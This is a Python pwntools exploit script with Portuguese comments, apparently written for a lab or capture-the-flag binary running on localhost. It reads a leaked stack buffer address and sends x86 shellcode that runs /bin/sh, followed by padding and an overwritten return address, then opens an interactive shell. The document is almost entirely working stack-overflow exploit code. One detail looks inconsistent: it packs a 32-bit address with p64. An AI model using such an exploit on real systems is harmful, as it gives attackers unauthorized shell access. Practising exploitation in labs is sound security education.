from pwn import *

debug = True

'''
if debug:
	r = process("gdb")
	r.sendline("file shellcode")
	#r.sendline("b *0x.....") #colocar um breakpoint se for necessario
	r.sendline("r") #run
else:
	r = process("./shellcode")
'''

r = remote("127.0.0.1", 1337)

r.sendline("2")
s = r.recvuntil("Give me the first string: ")

indexA = s.find("0x")+2
bufferAddress = int(s[indexA:indexA+8], 16)
info("Leak: buffer address = %s" % hex(bufferAddress))
#No GDB o buffer address nao muda porque o ASLR fica desligado no GDB

#Vamos usar shellcode e retornar para o shellcode que esta na stack, visto que o NX esta disabled
#exemplo de shellcode para executar uma shell /bin/sh em x86 -> 32 bits
#http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

#completar aqui
buffer = shellcode + "A"*(118-25-4)  + p64(bufferAddress)
#buffer = shellcode + padding... + address do buffer -> retornar para o inicio do shellcode quando a funcao der ret

r.sendline(buffer)
r.sendline("A") #second string

r.interactive()
